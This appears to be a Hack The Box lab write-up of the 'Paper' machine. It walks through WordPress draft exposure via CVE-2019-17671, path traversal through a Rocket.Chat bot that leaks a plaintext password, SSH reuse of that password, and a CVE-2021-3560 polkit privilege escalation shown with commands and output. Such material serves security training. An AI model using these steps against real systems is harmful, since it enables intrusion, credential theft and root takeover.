---
title: 'Paper'
date: '2026-09-11'
excerpt: 'Easy - Linux (CJCA Preparation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Paper</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4"> </p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many TCP ports are open on the remote host?</p>
<p class="mb-3"></p>

```console
─[au-free-2]─[10.10.14.224]─[aaronamran@htb-rd5uou2l8n]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.136.31
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 02:47 EDT
Nmap scan report for 10.129.136.31
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.18 seconds
```

<p class="mb-5"><strong>Answer:</strong> 3</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the domain for the Wordpress blog?</p>
<p class="mb-3">We check the HTTP response headers using <code>curl -I http://[TARGET_IP]</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-rd5uou2l8n]─[~]
└──╼ [★]$ curl -I 10.129.136.31
HTTP/1.1 403 Forbidden
Date: Fri, 11 Sep 2026 06:55:29 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

<p class="mb-5"><strong>Answer:</strong> office.paper</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> Which 2019 CVE is the wordpress version vulnerable to?</p>
<p class="mb-3">We explore around <code>http://office.paper</code> to understand what are its contents. We discover this comment, which hints about a potential vulnerability discovered.</p>

![Paper1](/images/paper_hackthebox_image1.png)

<p class="mb-3">First we need to identify the target's WordPress version. We use WPScan for accuracy: <code>wpscan --enumerate ap --url http://office.paper</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-rd5uou2l8n]─[~]
└──╼ [★]$ wpscan --enumerate ap --url http://office.paper
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://office.paper/ [10.129.136.31]
[+] Started: Fri Sep 11 02:50:26 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 11 02:50:40 2026
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 10.464 KB
[+] Data Received: 24.529 MB
[+] Memory used: 259.02 MB
[+] Elapsed time: 00:00:13
```

<p class="mb-3">From the comment we found earlier and the WordPress version we now know, googling 'Wordpress v5.2.3 CVE' reveals that this version is vulnerable to CVE-2019-17671 and the vulnerability is about allowing an unauthenticated user to view private or draft posts due to an issue within WP_Query. The POC is basically as follows:</p>

```
http://office.paper/?static=1
```

<p class="mb-5"><strong>Answer:</strong> CVE-2019-17671</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What is the secret registration URL of the employee chat system?</p>
<p class="mb-3">Loading the PoC <code>http://office.paper/?static=1</code> in the browser reveals new clues.</p>

![Paper2](/images/paper_hackthebox_image2.png)

<p class="mb-3">We see the secret registration URL at <code>http://chat.office.paper/register/8qozr226AhkCHZdyY</code>.</p>
<p class="mb-5"><strong>Answer:</strong> http://chat.office.paper/register/8qozr226AhkCHZdyY</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the name of the bot running on the Rocket Chat instance?</p>
<p class="mb-3">Visiting the secret registration URL shows us an account registration page. For simplicity sake we use the username <code>testuser</code>, email address <code>test@user.com</code> and password <code>testuser</code>. Once we are logged in, we will join a chat channel, where we can see the name of the bot.</p>

![Paper3](/images/paper_hackthebox_image3.png)

<p class="mb-5"><strong>Answer:</strong> recyclops</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Which recyclops commands allows listing files?</p>
<p class="mb-3">Reading the guide from recyclops in the general chat channel, and directly chatting with the bot allows us to test the commands.</p>

![Paper4](/images/paper_hackthebox_image4.png)

<p class="mb-5"><strong>Answer:</strong> list</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What is the file name of the file that contains the configuration information of hubot running on the chat system?</p>
<p class="mb-3">Running <code>list ../hubot</code> in recyclops chat reveals the following:</p>

```console
Fetching the directory listing of ../hubot
total 168
drwx------ 8 dwight dwight 4096 Sep 16 2021 .
drwx------ 11 dwight dwight 281 Feb 6 2022 ..
-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
drwx------ 8 dwight dwight 163 Jul 3 2021 .git
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
-rw-r--r-- 1 dwight dwight 51649 Sep 11 03:33 .hubot.log
-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts
-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
```

<p class="mb-5"><strong>Answer:</strong> .env</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the password obtained from that configuration information?</p>
<p class="mb-3">Running <code>file ../hubot/.env</code> outputs the following:</p>

```console
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

<p class="mb-5"><strong>Answer:</strong> Queenofblad3s!23</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> Which regular user with a home directory exists on Paper other than rocketchat?</p>
<p class="mb-3">Notice the owner for files and folders being <code>dwight</code>.</p>
<p class="mb-5"><strong>Answer:</strong> dwight</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> Submit the flag located in the dwight user's home directory.</p>
<p class="mb-3">Our Nmap scan earlier revealed that port 22 for SSH was also open. Now that we know the username is <code>dwight</code>, we attempt to SSH and login using the password found in the <code>.env</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-rd5uou2l8n]─[~]
└──╼ [★]$ ssh dwight@10.129.136.31
The authenticity of host '10.129.136.31 (10.129.136.31)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.136.31' (ED25519) to the list of known hosts.
dwight@10.129.136.31's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ whoami
dwight
[dwight@paper ~]$ pwd
/home/dwight
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat user.txt
2cb2a0b28efe1699fc4cc6293b0638c4
```

<p class="mb-5"><strong>Answer:</strong> 2cb2a0b28efe1699fc4cc6293b0638c4</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> What is the polkit version on the remote host?</p>
<p class="mb-3">Running <code>rpm -qa | grep polkit</code> reveals the software installed and its version.</p>

```console
[dwight@paper ~]$ rpm -qa |grep polkit
polkit-0.115-6.el8.x86_64
polkit-pkla-compat-0.1-12.el8.x86_64
polkit-libs-0.115-6.el8.x86_64
```

<p class="mb-5"><strong>Answer:</strong> 0.115-6</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?</p>
<p class="mb-3">We </p>
<p class="mb-5"><strong>Answer:</strong> CVE-2021-3560</p>
<br />


<p class="mb-2"><strong>Question 13:</strong> Submit the flag located in root's home directory.</p>
<p class="mb-3">We came across a <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh" target="_blank" rel="noopener noreferer">publicly available exploit for CVE-2021-3560</a> and download it in our local machine. Then we run Python web server from our local machine, and from the SSH session as <code>dwight</code> on the target machine, we download the file, change file permissions to make it executable, and we execute it. The exploit script adds a new user and password of our choice. It might take few tries, but once it is done, we can switch to the newly created user with root privileges and read the flag.</p>

```console
[dwight@paper ~]$ ./polkit.sh -u=newuser -p=newpassword

[!] Username set as : newuser
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username newuser...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username newuser  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - newuser
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su newuser
su: user newuser does not exist
[dwight@paper ~]$ ./polkit.sh -u=newuser -p=newpassword

[!] Username set as : newuser
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username newuser...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username newuser  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - newuser
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su newuser
Password: 
[newuser@paper dwight]$ id
uid=1005(newuser) gid=1005(newuser) groups=1005(newuser),10(wheel)
[newuser@paper dwight]$ ls -al /root
ls: cannot open directory '/root': Permission denied
[newuser@paper dwight]$ sudo ls -al /root

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for newuser: 
total 44
dr-xr-x---.  8 root root 4096 Sep 11 02:52 .
dr-xr-xr-x. 17 root root  244 Jan 17  2022 ..
-rw-------.  1 root root 1438 Jul  3  2021 anaconda-ks.cfg
lrwxrwxrwx.  1 root root    9 Jul  3  2021 .bash_history -> /dev/null
-rw-r--r--.  1 root root   18 Jul  3  2021 .bash_logout
-rw-r--r--.  1 root root  176 Jul  3  2021 .bash_profile
-rw-r--r--.  1 root root  233 Jul  3  2021 .bashrc
drwx------.  3 root root   19 Jul  3  2021 .cache
drwx------.  6 root root   64 Jul  3  2021 .config
-rw-r--r--.  1 root root  100 May 11  2019 .cshrc
-rw-------.  1 root root  328 Feb  1  2022 .dbshell
drwx------.  3 root root   25 Jul  3  2021 .dbus
-rw-------.  1 root root   16 Jul  3  2021 .esd_auth
-rw-r--r--.  1 root root 1593 Jul  3  2021 initial-setup-ks.cfg
-rw-------.  1 root root    0 Jul  3  2021 .mongorc.js
drwxr-xr-x.  5 root root   83 Jul  3  2021 .npm
drwxr-xr-x.  2 root root   52 Jan 13  2022 .restore
-r--------.  1 root root   33 Sep 11 02:52 root.txt
drwx------.  2 root root    6 Sep 16  2021 .ssh
-rw-r--r--.  1 root root  129 May 11  2019 .tcshrc
[newuser@paper dwight]$ sudo cat /root/root.txt
550c0321c5f7e8b047b2464f95051c3c
```

<p class="mb-5"><strong>Answer:</strong> 550c0321c5f7e8b047b2464f95051c3c</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>